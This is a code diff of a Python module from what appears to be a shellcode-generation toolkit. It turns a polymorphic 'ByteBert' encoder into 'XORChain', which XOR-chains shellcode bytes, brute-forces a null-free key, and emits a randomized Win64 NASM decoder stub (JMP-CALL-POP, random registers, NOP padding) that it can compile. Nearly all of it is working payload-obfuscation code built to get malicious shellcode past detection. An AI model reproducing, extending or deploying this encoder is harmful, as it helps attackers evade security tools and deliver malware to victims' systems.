@@ -1,14 +1,8 @@
 ########################################################
-### ByteBert Module
-### Status: migrated 085
+### ByteBert2 Module
+### Status: 086 release
 ### 
 ########################################################
-
-### DEFINITIONS
-# reg1 = save / read encryptedbyte(odd)
-# reg2 = shellcode indexer
-# reg3 = counter
-# reg1, reg2 = random.sample(registers, 2)
 
 import random
 from utils.asm import variable_instruction_set
@@ -19,16 +13,20 @@ from os import path as osp
 from os import name as os_name
 from os import urandom as urandom
 from subprocess import run
-from tqdm import tqdm
+#import threading
+#import time
+#from tqdm import tqdm
+#from yaspin import yaspin
 from utils.const import *
 
 CATEGORY    = 'encoder'
-DESCRIPTION = 'ByteBert - Advanced polymorphic Encoder Stub'
+DESCRIPTION = 'XORChain - Encrypt each byte with the previous one'
 
 arglist = {
-    'input':                    { 'value': None, 'desc': 'Input file to use with bytebert' },
-    'output':                   { 'value': None, 'desc': 'Outputfile for bytebert' },
+    'input':                    { 'value': None, 'desc': 'Input file to use with xorchain' },
+    'output':                   { 'value': None, 'desc': 'Outputfile for xorchain' },
     'variable_padding':         { 'value': False, 'desc': 'Inserts random NOPs to differ the padding' },
+    'compile':                  { 'value': False, 'desc': 'Compile with nasm' },
     'verbose':                  { 'value': False, 'desc': 'Verbose mode' }
 }
 
@@ -37,12 +35,13 @@ def register_arguments(parser):
             parser.add_argument('-o', '--output', help=arglist['output']['desc'])
             parser.add_argument('-v', '--variable-padding', type=int, help=arglist['variable_padding']['desc'])
             add = parser.add_argument_group('Additional')
+            add.add_argument('--compile', action='store_true', help=arglist['compile']['desc'])
             add.add_argument('--verbose', action='store_true', help=arglist['verbose']['desc'])
 
 class module:
     Author = 'psycore8'
-    Version = '0.4.5'
-    DisplayName = 'ByteBERT-ENC'
+    Version = '0.1.1'
+    DisplayName = 'XOR-CHAiN'
     Shellcode = ''
     Shellcode_Bin = b''
     Shellcode_Length = 0
@@ -54,43 +53,37 @@ class module:
     relay = False
     relay_input = False
     relay_output = False
-    shell_path = '::encoder::ByteBert'
+    shell_path = '::encoder::XORChain'
 
-    def __init__(self, input, output, variable_padding=0, verbose=bool):
+    def __init__(self, input, output, variable_padding=0, compile=bool, verbose=bool):
         self.input = input
         self.output = output
         if variable_padding == None:
             variable_padding = 0
         self.variable_padding = variable_padding
+        self.compile = compile
         self.verbose = verbose
         self.compiler_cmd = nasm
 
-    def msg(self, message_type, ErrorExit=False, MsgVar=any):
+    class messages:
+        test = 'Test Message'
+
+    def msg(self, message_type, MsgVar=any, ErrorExit=False):
         messages = {
             'pre.head'      : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
             'post.done'     : f'{s_ok} DONE!',
-            'proc.ssize'    : f'{s_note} ASM script generated with a size of {self.stub_size} bytes',
-            'proc.rkey'     : f'{s_note} Random key: {self.key} ({hex(self.key)})',
             'error.input'   : f'{s_fail} File {self.input} not found or cannot be opened.',
             'error.output'  : f'{s_fail} File {MsgVar} not found or cannot be opened.',
-            'proc.psize'    : f'{s_note} Payload size: {self.Shellcode_Length}',
-            'proc.xor_ok'   : f'{s_ok} Encoded payload appended!',
             'proc.out'      : f'{s_ok} File created in {MsgVar}\n{s_note} Hash: {self.hash}',
-            'proc.comp_try' : f'{s_note} Try to compile object file',
             'proc.input_ok' : f'{s_ok} File {self.input} loaded\n{s_note} Size of shellcode {self.data_size} bytes\n{s_note} Hash: {self.hash}',
             'proc.compile'  : f'{s_ok} File {MsgVar} created\n{s_note} Size of shellcode {self.data_size} bytes\n{s_note} Hash: {self.hash}',
-            'proc.ext'      : f'{s_info} Extract .text section from object file',
-            'proc.fsize'    : f'{s_info} Final shellcode size: {MsgVar} bytes',
             'error.xor_ok'  : f"{s_fail} XOR encoded Shellcode error, aborting script execution",
             'error.nasm1'   : f'{s_fail} nasm.exe not found! Download and place it into the shencode directory: {f_link}https://nasm.us/{f_end}',
-            'key.try'       : f'{s_info} Bruteforcing XOR key',
             'error.key'     : f'{s_fail} \\x00 detected! Proceeding with random key',
-            'error.nasm2'   : f'{s_info} You can compile it by hand: nasm.exe -f win64 {MsgVar}',
-            # Verbose
-            'v.registers'   : f'{s_info} Selected registers: {MsgVar}',
-            'v.inst'        : f'{s_info} {MsgVar}',
-            'v.size'        : f'{s_info} Size instruction: {MsgVar}',
-            'v.padding'     : f'{s_info} Added NOP at line {MsgVar}'
+            'error.nasm2'   : f'{s_info} You can compile manually: nasm.exe -f win64 {MsgVar}',
+            'mok'            : f'{s_ok} {MsgVar}',
+            'mnote'          : f'{s_note} {MsgVar}',
+            'merror'         : f'{s_fail} {MsgVar}'
         }
         print(messages.get(message_type, f'{message_type} - this message type is unknown'))
         if ErrorExit:
@@ -102,27 +95,35 @@ class module:
         else:
             return False
         
-    def encrypt(self, data: bytes, xor_key: int) -> bytes:
+    def find_valid_xor_key(self):
+        self.msg('mnote', 'Bruteforcing XOR key')
+        key = self.key
+        brute_force_data = self.encrypt(self.Shellcode_Bin)
+        if all((b ^ key) != 0 for b in brute_force_data): 
+            self.msg('mok', f'Valid XOR key found: {hex(key)}')
+            return key
+        if self.verbose:
+            self.msg('merror', f'Found 00 bytes for XOR key {hex(key)}')
+        return 0 
+    
+    def encrypt(self, data: bytes) -> bytes:
         transformed = bytearray()
-        prev_enc_byte = 0
-        for i, byte in enumerate(data):
-            if i % 2 == 0: # even byte positions
-                enc_byte = byte ^ xor_key
-            else:          # odd byte positions
-                enc_byte = byte ^ prev_enc_byte
-            
+        prev_byte = 0
+        for i, byte in enumerate(self.Shellcode_Bin):
+            if prev_byte == 0:
+                enc_byte = byte ^ self.key
+            else:
+                enc_byte = byte ^ prev_byte
             transformed.append(enc_byte)
-            prev_enc_byte = enc_byte
-
+            prev_byte = byte
         return bytes(transformed)
 
     def LoadHeader(self):
         self.Modified_Shellcode = self.generate_win64_stub()
         self.stub_size = len(self.Modified_Shellcode)
-        self.msg('proc.ssize')
+        self.msg('mnote', f'ASM script generated with a size of {self.stub_size} bytes')
 
     def LoadShellcode(self):
-        self.key = random.randint(1, 255)
         if self.relay_input:
             shellcode_bytes = self.input
         else:
@@ -131,14 +132,20 @@ class module:
                     shellcode_bytes = file.read()
             except FileNotFoundError:
                 self.msg('error.input', True)
-        self.msg('proc.rkey')
+        
+        self.Shellcode_Bin = shellcode_bytes
+        while True:
+            self.key = random.randint(1, 255)
+            if self.find_valid_xor_key() != 0:
+                break
+        #self.msg('mnote', f'Random key: {self.key} ({hex(self.key)})')
 
-        for i in tqdm (range (100), colour='magenta', leave=False):
-            self.Shellcode_Bin = self.encrypt(shellcode_bytes, self.key)
+        self.Shellcode_Bin = self.encrypt(shellcode_bytes)
+            
         size = len(self.Shellcode_Bin)
         self.Shellcode_Length = str(size)
         self.end_offset = str( 404 )
-        self.msg('proc.psize')
+        self.msg('mnote', f'Payload size: {self.Shellcode_Length}')
 
     def ConvertShellCodeToStr(self):
         self.Shellcode = [f"0x{byte:02X}" for byte in self.Shellcode_Bin]
@@ -146,7 +153,7 @@ class module:
 
     def AppendShellcode(self):
         self.Modified_Shellcode += self.Shellcode
-        self.msg('proc.xor_ok')
+        self.msg('mok', 'Encoded payload appended!')
 
     def WriteToFile(self, data, filename):
       if isinstance(data, bytes):
@@ -162,7 +169,7 @@ class module:
     def process(self):
         self.msg('pre.head')
 
-        fn_Root, output_file_extension = osp.splitext(self.output)
+        fn_Root, _ = osp.splitext(self.output)
         fn_nasm = f'{fn_Root}.nasm'
         fn_obj = f'{fn_Root}.obj'
 
@@ -180,18 +187,18 @@ class module:
         self.WriteToFile(self.Modified_Shellcode, fn_nasm)
         if CheckFile(fn_nasm):
             self.data_size, self.hash = GetFileInfo(fn_nasm)
-            self.msg('proc.out', False, f'{fn_nasm}')
+            self.msg('proc.out', f'{fn_nasm}')
         else:
-            self.msg('error.output', True, f'{fn_nasm}')
-        if self.CheckNasm():
-            self.msg('proc.comp_try')
+            self.msg('error.output', f'{fn_nasm}', True)
+        if self.CheckNasm() and self.compile:
+            self.msg('mnote', 'Try to compile object file')
             self.CompileObjectFile(fn_nasm, fn_obj)
             if CheckFile(fn_obj):
                 self.data_size, self.hash = GetFileInfo(fn_obj)
-                self.msg('proc.compile', False, f'{fn_obj}')
-                self.msg('proc.ext')
+                self.msg('proc.compile', f'{fn_obj}')
+                self.msg('mnote', 'Extract .text section from object file')
                 final_shellcode = get_coff_section(fn_obj, '.text')
-                self.msg('proc.fsize', False, len(final_shellcode))
+                self.msg('mnote', f'Final shellcode size: {len(final_shellcode)} bytes')
                 if self.relay_output:
                     self.msg('post.done')
                     return final_shellcode
@@ -200,95 +207,68 @@ class module:
                     self.msg('post.done')
         else:
             self.msg('error.nasm1')
-            self.msg('error.nasm2', True, f'{fn_nasm} -o {fn_obj}')
+            self.msg('error.nasm2', f'{fn_nasm} -o {fn_obj}', True)
 
     def generate_win64_stub(self):
         vi = variable_instruction_set()
-        reg1, reg2, reg3, reg4 = random.sample(vi.multi_bit_registers, 4)
-
-        inst_asm_reg_zero = ['xor', 'sub']
-        inst_asm_jmp_cond = ['jz', 'je']
-        inst_asm_jmp_ncond = ['jnz', 'jne']
-        inst_asm_inc_reg = [
-            f'inc {reg4[0]}',
-            f'add {reg4[0]}, 1',
-            f'lea {reg4[0]}, [{reg4[0]}+1]'
-            ]
-        inst_asm_dec_reg = [
-            f'dec {reg3[0]}',
-            f'sub {reg3[0]}, 1',
-            f'lea {reg3[0]}, [{reg3[0]}-1]'
-            ]
+        rax, rbx, rdx = random.sample(vi.multi_bit_registers, 3)
+        inst_asm_reg_zero = vi.register_set_zero
+        asm_jmp_cond = vi.jump_conditional_positive
+        asm_inc_reg = vi.increase_register(rbx[0])
+        asm_dec_reg = vi.decrease_register(rax[0])
         
         rc = random.choice
         asm_reg_zero    = random.choice(inst_asm_reg_zero)
-        asm_jmp_cond    = random.choice(inst_asm_jmp_cond)
-        asm_jmp_ncond   = random.choice(inst_asm_jmp_ncond)
-        asm_inc_reg     = random.choice(inst_asm_inc_reg)
-        asm_dec_reg     = random.choice(inst_asm_dec_reg)
+        asm_jmp_cond    = random.choice(asm_jmp_cond)
 
         if self.verbose:
-            self.msg('v.registers', False, f'{reg1[0]}, {reg2[0]}, {reg3[0]}, {reg4[0]}')
-            self.msg('v.inst', False, f'Instruction set: {asm_jmp_cond} / {asm_jmp_ncond} / {asm_reg_zero}')
-            self.msg('v.inst', False, f'Increase, decrease: {asm_inc_reg} {asm_dec_reg}')
+            #self.msg('v.registers', False, f'{rax[0]}, {rbx[0]}, {rdx[0]}')
+            #self.msg('v.inst', False, f'Instruction set: {asm_jmp_cond} / {asm_reg_zero}')
+            #self.msg('v.inst', False, f'Increase, decrease: {asm_inc_reg} {asm_dec_reg}')
+            self.msg('mnote', f'Selected registers: {rax[0]}, {rbx[0]}, {rdx[0]}')
+            #self.msg('mnote', f'Instruction set: {asm_jmp_cond} / {asm_reg_zero}')
 
         size = int(self.Shellcode_Length)
         
         if size <= 255:
-           sc_size = f'mov {reg3[3]}, {size}'
+           sc_size = f'mov {rax[3]}, {size}'
         elif size <= 65535:
-           sc_size = f'mov {reg3[2]}, {size}'
+           sc_size = f'mov {rax[2]}, {size}'
         else:
-           sc_size = f'mov {reg3[1]}, {size}'
+           sc_size = f'mov {rax[1]}, {size}'
 
         if self.verbose:
-            self.msg('v.size', False, f'{sc_size}')
+            self.msg('mnote', f'Size instruction: {sc_size}')
         
         stub64 = f"""
             section .data
 
-            section .text
-                global _start
+                section .text
+                    global _start
 
                     _start:
-                        {rc(inst_asm_reg_zero)} {reg1[0]}, {reg1[0]}
-                        {rc(inst_asm_reg_zero)} {reg2[0]}, {reg2[0]}
-                        {rc(inst_asm_reg_zero)} {reg3[0]}, {reg3[0]}
-                        {rc(inst_asm_reg_zero)} {reg4[0]}, {reg4[0]}
-                        {sc_size}              ; length of embedded shellcode
-                        jmp short call_decoder   ; JMP-CALL-POP: 1. JMP
+                        {rc(inst_asm_reg_zero)} {rax[0]}, {rax[0]} ; stores shellcode size
+                        {rc(inst_asm_reg_zero)} {rbx[0]}, {rbx[0]} ; stores pointer to shellcode
+                        {rc(inst_asm_reg_zero)} {rdx[0]}, {rdx[0]} ; stores the key (random byte or previous decrypted byte)
+                        {sc_size}  ; shellcode size
+                        mov {rdx[3]}, {self.key}  ; initial key
+                        jmp short call_decoder
 
                     decoder:
-                        pop {reg4[0]}                  ; JMP-CALL-POP: 3. POP
-
+                        pop {rbx[0]}
+                    
                     decode_loop:
-                        test {reg3[0]}, {reg3[0]}            ; are we ready?
-                        {asm_jmp_cond} Shellcode             ; jump, if finished
-
-                        ; even byte (Index % 2 == 0)
-                        mov {reg2[0]}, {reg4[0]}
-                        sub {reg2[3]}, Shellcode        ; calculate Index (rsi - Shellcode)
-                        test {reg2[3]}, 1               ; check: Index & 1 (odd or even?)
-                        {asm_jmp_ncond} odd_byte             ; jump, if odd
-
-                        ; processing for even bytes
-                        mov {reg1[3]}, [{reg4[0]}]			 ; save actual encrypted byte for the next loop
-                        xor byte [{reg4[0]}], {self.key}     ; decrypt byte in shellcode: byte sub negate(key)
-                        jmp post_processing
-
-                    odd_byte:
-                        ; processing for odd bytes
-                        ; not {reg1[3]}
-                        xor byte [{reg4[0]}], {reg1[3]}        ; decrypt: encoded_byte sub negate(previous_encoded_byte)
-
-                    post_processing:
-                        {asm_inc_reg}                  ; next encrypted byte
-                        {asm_dec_reg}                  ; decrease length
-                        jmp decode_loop          ; back to the loop
+                        test {rax[0]}, {rax[0]}
+                        {asm_jmp_cond} Shellcode
+                        xor byte [{rbx[0]}], {rdx[3]}
+                        mov {rdx[3]}, [{rbx[0]}]
+                        {asm_inc_reg}
+                        {asm_dec_reg}
+                        jmp decode_loop
 
                     call_decoder:
-                        call decoder             ; JMP-CALL-POP: 2. CALL
-                  """
+                        call decoder
+        """
         
         if self.variable_padding != 0:
             i = 0
@@ -301,8 +281,10 @@ class module:
                 paddy.insert(random_noppy_index, noppy)
                 stub64_paddy = '\n'.join(paddy)
                 if self.verbose:
-                    self.msg('v.padding', False, f'{random_noppy_index}')
+                    #self.msg('v.padding', False, f'{random_noppy_index}')
+                    self.msg('mnote', f'Added NOP at line {random_noppy_index}')
                 i += 1
             return stub64_paddy
         else:
             return stub64
+    
